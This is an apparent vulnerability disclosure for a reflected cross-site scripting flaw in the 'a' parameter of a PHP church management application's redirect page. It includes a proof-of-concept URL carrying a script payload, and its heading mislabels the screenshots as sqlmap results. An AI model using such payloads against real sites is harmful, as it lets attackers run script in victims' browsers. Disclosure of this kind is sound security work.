### Exploit Title: Best church management software - xss
### Date: 2025-02/11
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/17856/best-church-management-software-free-download-full-version.html
### Version: 1.0
### Tested on: windows10 + phpstudy

# 1./admin/redirect.php Parameter a has xss

### Sample request POC #1

```
http://localhost:8001/admin/redirect.php?a=%3Cscript%3Ealert(1)%3C/script%3E
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739240731354.jpg "Best church management software")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739240708154.jpg "Best church management software")
